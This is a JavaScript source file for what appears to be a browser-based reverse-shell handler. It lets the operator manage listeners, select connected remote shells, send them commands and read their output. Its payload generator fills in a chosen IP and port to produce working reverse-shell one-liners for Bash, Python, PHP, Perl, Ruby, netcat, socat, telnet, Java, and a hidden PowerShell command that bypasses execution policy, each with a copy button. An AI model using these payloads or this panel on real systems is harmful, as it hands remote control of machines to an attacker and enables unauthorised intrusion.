const state = {
    user: null,
    listeners: [],
    selectedListenerId: null,
    shells: [],
    selectedShellId: null,
    hideDisconnected: true,
    outputPositions: {},
    commandHistory: new Map(),
    commandHistoryIndex: -1,
};

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

async function api(url, options = {}) {
    const res = await fetch(url, {
        credentials: 'same-origin',
        headers: { 'Content-Type': 'application/json', ...options.headers },
        ...options,
    });
    const data = await res.json();
    if (!res.ok && res.status === 401) {
        window.location.href = '/login';
    }
    return { ok: res.ok, status: res.status, data };
}

// Auth
async function checkAuth() {
    const { ok, data } = await api('/api/auth/me');
    if (!ok) {
        window.location.href = '/login';
        return;
    }
    state.user = data.user;
    document.getElementById('user-display').textContent = `Logged in as ${data.user.username}`;
    const settingsLink = document.getElementById('settings-link');
    if (data.user.is_admin) {
        settingsLink.classList.remove('hidden');
    }
}

document.getElementById('logout-btn').addEventListener('click', async () => {
    await api('/api/auth/logout', { method: 'POST' });
    window.location.href = '/login';
});

document.getElementById('payload-btn').addEventListener('click', () => {
    openPayloadModal();
});

// Listeners
async function loadListeners() {
    const { ok, data } = await api('/api/listeners');
    if (!ok) return;
    state.listeners = data.listeners;
    renderListeners();
}

function renderListeners() {
    const container = document.getElementById('listener-list');
    container.innerHTML = '';

    if (state.listeners.length === 0) {
        container.innerHTML = '<p class="empty-msg">No listeners yet</p>';
        return;
    }

    for (const lst of state.listeners) {
        const div = document.createElement('div');
        div.className = 'listener-item' + (lst.id === state.selectedListenerId ? ' selected' : '');
        div.innerHTML = `
            <div class="listener-address">${escapeHtml(lst.address + ':' + lst.port)}</div>
            <div class="listener-meta">
                <span class="listener-status ${lst.is_active ? '' : 'inactive'}">${lst.is_active ? 'Active' : 'Stopped'}</span>
                <span>${lst.shell_count} shells</span>
            </div>
            <div class="listener-actions">
                ${lst.is_active
                    ? '<button class="delete-btn" data-id="' + lst.id + '">Stop</button>'
                    : '<button class="delete-btn danger" data-id="' + lst.id + '">Delete</button>'}
            </div>
        `;
        div.addEventListener('click', (e) => {
            if (e.target.tagName === 'BUTTON') return;
            selectListener(lst.id);
        });
        const actionBtn = div.querySelector('.delete-btn');
        if (actionBtn) {
            actionBtn.addEventListener('click', async (e) => {
                e.stopPropagation();
                if (actionBtn.textContent === 'Stop') {
                    await api('/api/listeners/' + lst.id, { method: 'DELETE' });
                } else {
                    await api('/api/listeners/' + lst.id + '/remove', { method: 'DELETE' });
                }
                if (state.selectedListenerId === lst.id) {
                    state.selectedListenerId = null;
                    state.shells = [];
                    state.selectedShellId = null;
                    renderShells();
                    clearTerminal();
                }
                await loadListeners();
            });
        }
        container.appendChild(div);
    }
}

function selectListener(id) {
    state.selectedListenerId = id;
    state.selectedShellId = null;
    clearTerminal();
    renderListeners();
    loadShells(id);
}

// Listener form
document.getElementById('listener-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    const address = document.getElementById('listener-address').value.trim();
    const port = document.getElementById('listener-port').value.trim();
    const errEl = document.getElementById('listener-error');

    if (!port) {
        errEl.textContent = 'Port is required';
        errEl.classList.remove('hidden');
        return;
    }

    errEl.classList.add('hidden');
    const { ok, data } = await api('/api/listeners', {
        method: 'POST',
        body: JSON.stringify({ address, port: parseInt(port) }),
    });

    if (ok) {
        document.getElementById('listener-port').value = '';
        await loadListeners();
    } else {
        errEl.textContent = data.error;
        errEl.classList.remove('hidden');
    }
});

// Shells
async function loadShells(listenerId) {
    const { ok, data } = await api('/api/listeners/' + listenerId + '/shells');
    if (!ok) return;
    state.shells = data.shells;
    renderShells();
}

function renderShells() {
    const container = document.getElementById('shell-list');
    container.innerHTML = '';

    const visible = state.hideDisconnected
        ? state.shells.filter(s => s.is_active)
        : state.shells;

    if (visible.length === 0) {
        const msg = state.hideDisconnected && state.shells.length > 0
            ? 'All shells disconnected'
            : 'No shells connected';
        container.innerHTML = '<p class="empty-msg">' + msg + '</p>';
        return;
    }

    for (const s of visible) {
        const div = document.createElement('div');
        div.className = 'shell-item' +
            (s.id === state.selectedShellId ? ' selected' : '') +
            (s.is_active ? '' : ' disconnected');
        div.innerHTML = `
            <div class="shell-ip">${escapeHtml(s.ip_address)}${s.hostname ? ' (' + escapeHtml(s.hostname) + ')' : ''}</div>
            <div class="shell-meta">
                ${s.is_active ? 'Connected: ' + new Date(s.connected_at).toLocaleString() : 'Disconnected'}
            </div>
            ${s.is_active ? '<button class="kill-btn" data-id="' + s.id + '">Kill</button>' : ''}
        `;
        div.addEventListener('click', (e) => {
            if (e.target.tagName === 'BUTTON') return;
            selectShell(s.id);
        });
        const killBtn = div.querySelector('.kill-btn');
        if (killBtn) {
            killBtn.addEventListener('click', async (e) => {
                e.stopPropagation();
                await api('/api/shells/' + s.id, { method: 'DELETE' });
                if (state.selectedShellId === s.id) {
                    state.selectedShellId = null;
                    clearTerminal();
                }
                await loadShells(state.selectedListenerId);
            });
        }
        container.appendChild(div);
    }
}

function selectShell(id) {
    state.selectedShellId = id;
    state.outputPositions[id] = 0;
    clearTerminal();
    renderShells();

    const shell = state.shells.find(s => s.id === id);
    if (shell && shell.is_active) {
        document.getElementById('command-input').disabled = false;
        document.getElementById('send-btn').disabled = false;
        document.getElementById('command-input').focus();
    } else {
        document.getElementById('command-input').disabled = true;
        document.getElementById('send-btn').disabled = true;
    }

    const history = state.commandHistory.get(id) || [];
    state.commandHistoryIndex = history.length;
    document.getElementById('command-input').value = '';
}

// Terminal
function clearTerminal() {
    const output = document.getElementById('terminal-output');
    output.innerHTML = '';
    document.getElementById('command-input').disabled = true;
    document.getElementById('send-btn').disabled = true;
}

function appendOutput(text) {
    const output = document.getElementById('terminal-output');
    output.textContent += text;
    output.scrollTop = output.scrollHeight;
}

async function fetchOutput(shellId) {
    const since = state.outputPositions[shellId] || 0;
    const { ok, data } = await api('/api/shells/' + shellId + '/output?since=' + since);
    if (!ok) {
        if (data.error === 'shell not found') {
            state.selectedShellId = null;
            clearTerminal();
            renderShells();
        }
        return;
    }
    if (data.output) {
        appendOutput(data.output);
    }
    state.outputPositions[shellId] = data.position;
}

// Command sending
document.getElementById('command-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    const input = document.getElementById('command-input');
    const command = input.value.trim();
    if (!command || !state.selectedShellId) return;

    const history = state.commandHistory.get(state.selectedShellId) || [];
    history.push(command);
    state.commandHistory.set(state.selectedShellId, history);
    state.commandHistoryIndex = history.length;

    input.value = '';
    const { ok } = await api('/api/shells/' + state.selectedShellId + '/command', {
        method: 'POST',
        body: JSON.stringify({ command }),
    });

    if (!ok) {
        appendOutput('\n[Error: shell disconnected]\n');
        document.getElementById('command-input').disabled = true;
        document.getElementById('send-btn').disabled = true;
        state.selectedShellId = null;
        renderShells();
    }
});

document.getElementById('command-input').addEventListener('keydown', (e) => {
    if (e.key !== 'ArrowUp' && e.key !== 'ArrowDown') return;
    if (!state.selectedShellId) return;
    const history = state.commandHistory.get(state.selectedShellId) || [];
    if (history.length === 0) return;
    e.preventDefault();

    if (e.key === 'ArrowUp') {
        state.commandHistoryIndex = Math.max(0, state.commandHistoryIndex - 1);
    } else {
        state.commandHistoryIndex = Math.min(history.length, state.commandHistoryIndex + 1);
    }

    document.getElementById('command-input').value = state.commandHistoryIndex < history.length
        ? history[state.commandHistoryIndex]
        : '';
});

// Polling
async function poll() {
    await loadListeners();
    if (state.selectedListenerId) {
        await loadShells(state.selectedListenerId);
    }
    if (state.selectedShellId) {
        const shell = state.shells.find(s => s.id === state.selectedShellId);
        if (shell && shell.is_active) {
            await fetchOutput(state.selectedShellId);
        }
    }
}

document.getElementById('hide-disconnected').addEventListener('change', (e) => {
    state.hideDisconnected = e.target.checked;
    renderShells();
    if (state.selectedShellId) {
        const shell = state.shells.find(s => s.id === state.selectedShellId);
        if (!shell || (state.hideDisconnected && !shell.is_active)) {
            state.selectedShellId = null;
            clearTerminal();
        }
    }
});

// Payload generator
const payloads = [
    {
        name: 'Bash',
        code: (ip, port) => `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
    },
    {
        name: 'Bash (read line)',
        code: (ip, port) => `exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do $line 2>&5 >&5; done`,
    },
    {
        name: 'Python3',
        code: (ip, port) => `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
    },
    {
        name: 'Python',
        code: (ip, port) => `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
    },
    {
        name: 'PHP',
        code: (ip, port) => `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    },
    {
        name: 'Perl',
        code: (ip, port) => `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
    },
    {
        name: 'Ruby',
        code: (ip, port) => `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
    },
    {
        name: 'Netcat',
        code: (ip, port) => `nc -e /bin/sh ${ip} ${port}`,
    },
    {
        name: 'Netcat (no -e)',
        code: (ip, port) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,
    },
    {
        name: 'PowerShell',
        code: (ip, port) => `powershell -NoP -NonI -W Hidden -Exec Bypass -c "$c=New-Object System.Net.Sockets.TCPClient('${ip}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"`,
    },
    {
        name: 'Socat',
        code: (ip, port) => `socat exec:'/bin/sh' TCP:${ip}:${port}`,
    },
    {
        name: 'Telnet',
        code: (ip, port) => `rm -f /tmp/p; mknod /tmp/p p && telnet ${ip} ${port} 0</tmp/p | /bin/sh -i 2>&1 | tee /tmp/p`,
    },
    {
        name: 'Java',
        code: (ip, port) => `r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])\np.waitFor()`,
    },
];

let payloadExpanded = null;

function openPayloadModal(address, port) {
    const ipInput = document.getElementById('payload-ip');
    const portInput = document.getElementById('payload-port');
    const list = document.getElementById('payload-list');

    if (address !== undefined) {
        ipInput.value = address === '0.0.0.0' ? window.location.hostname || '10.0.0.1' : address;
        portInput.value = port;
    }

    ipInput.oninput = renderPayloads;
    portInput.oninput = renderPayloads;
    payloadExpanded = null;

    renderPayloads();
    document.getElementById('payload-overlay').classList.remove('hidden');
}

function renderPayloads() {
    const ip = document.getElementById('payload-ip').value || '10.0.0.1';
    const port = document.getElementById('payload-port').value || '4444';
    const list = document.getElementById('payload-list');
    list.innerHTML = '';

    for (const p of payloads) {
        const code = p.code(ip, parseInt(port) || 4444);
        const item = document.createElement('div');
        item.className = 'payload-item' + (payloadExpanded === p.name ? ' expanded' : '');

        const header = document.createElement('div');
        header.className = 'payload-header';
        header.innerHTML = `<span class="payload-name">${p.name}</span>`;

        const copyBtn = document.createElement('button');
        copyBtn.className = 'payload-copy-btn';
        copyBtn.textContent = 'Copy';
        copyBtn.addEventListener('click', async (e) => {
            e.stopPropagation();
            try {
                await navigator.clipboard.writeText(code);
                copyBtn.textContent = 'Copied!';
                copyBtn.classList.add('copied');
                setTimeout(() => {
                    copyBtn.textContent = 'Copy';
                    copyBtn.classList.remove('copied');
                }, 2000);
            } catch {
                const ta = document.createElement('textarea');
                ta.value = code;
                document.body.appendChild(ta);
                ta.select();
                document.execCommand('copy');
                document.body.removeChild(ta);
                copyBtn.textContent = 'Copied!';
                setTimeout(() => { copyBtn.textContent = 'Copy'; }, 2000);
            }
        });

        header.appendChild(copyBtn);
        header.addEventListener('click', () => {
            if (payloadExpanded === p.name) {
                payloadExpanded = null;
            } else {
                payloadExpanded = p.name;
            }
            renderPayloads();
        });

        const codeBlock = document.createElement('div');
        codeBlock.className = 'payload-code';
        codeBlock.textContent = code;

        item.appendChild(header);
        item.appendChild(codeBlock);
        list.appendChild(item);
    }
}

document.getElementById('payload-close').addEventListener('click', () => {
    document.getElementById('payload-overlay').classList.add('hidden');
});

document.getElementById('payload-overlay').addEventListener('click', (e) => {
    if (e.target === e.currentTarget) {
        document.getElementById('payload-overlay').classList.add('hidden');
    }
});

document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
        document.getElementById('payload-overlay').classList.add('hidden');
    }
});

// Init
async function init() {
    await checkAuth();
    await loadListeners();
    setInterval(poll, 2000);
}

init();
